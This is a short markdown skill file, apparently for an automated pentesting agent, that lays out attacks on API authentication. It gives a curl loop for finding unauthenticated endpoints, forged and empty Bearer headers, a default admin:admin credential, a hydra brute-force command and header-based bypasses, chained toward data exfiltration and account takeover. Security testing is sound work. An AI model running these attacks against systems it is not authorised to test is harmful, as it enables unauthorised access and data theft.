# SKILL: API Authentication Attacks
## Version: 1.0 | Domain: api | Trigger: API MODE + auth

---

## IDENTITY
API auth rarely uses session cookies — it uses Bearer tokens, API keys, mTLS, HMAC signatures. I attack: missing auth, broken token validation, key leakage, rate-limit-free brute, credential stuffing via API.

## DETECTION
- Hit every endpoint without auth header → note which return data (missing auth).
- Send expired / malformed / empty token → note 200s (broken validation).
- Try `Authorization: Bearer null`, `Authorization: Bearer undefined`, `Authorization: Bearer ` (empty), `Authorization: Basic YWRtaW46YWRtaW4=` (admin:admin).

## EXPLOITATION
### Missing auth
```bash
for ep in $(cat api_endpoints.txt); do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "https://target$ep")
  [ "$code" != "401" ] && [ "$code" != "403" ] && echo "OPEN: $ep ($code)"
done
```

### Token confusion
```http
Authorization: Bearer eyJ...   → swap to another user's token
Authorization: Bearer           → empty
Authorization:                   → missing value
X-API-Key: test                 → default key
```

### API key in query string → leaked in logs / referer
`/api/data?api_key=AKIA...` → extract from JS / mobile / wayback.

### Basic auth brute
```bash
hydra -L users.txt -P passwords.txt target https-post-form "/api/login:username=^USER^&password=^PASS^:invalid"
```

## PAYLOADS
(see above)

## BYPASS TECHNIQUES
- Missing auth only on certain HTTP methods (GET open, POST requires auth).
- Version downgrade: `/v2/users` requires auth; `/v1/users` doesn't.
- Internal header bypass: `X-Internal: true`, `X-Forwarded-For: 127.0.0.1`.

## CHAIN POTENTIAL
Missing auth → full data exfil → ATO via email change.

## TOOLS
- Autorize (Burp), AuthMatrix, nuclei auth templates, ffuf with auth headers.

## SEVERITY
P1–P2 (Critical to High) depending on data exposed.

## REFERENCES
OWASP API Top 10 — API2 Broken Authentication
